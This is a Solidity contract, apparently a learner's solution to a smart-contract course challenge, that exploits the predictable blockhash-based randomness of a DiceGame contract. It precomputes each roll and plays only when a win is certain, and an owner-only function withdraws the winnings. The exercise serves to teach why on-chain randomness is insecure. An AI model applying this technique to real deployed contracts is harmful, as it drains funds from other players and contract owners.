pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool succeed,) = payable(_addr).call{value : _amount}("");
        require(succeed, "Failed to withdraw ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Failed to have 0.002 ether in balance.");
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 _nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), _nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("THE ROLL IS ", roll);
        require(roll <= 2, "THE ROLL IS a LOSER, bailing.");
        console.log("THE ROLL IS a WINNER!");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
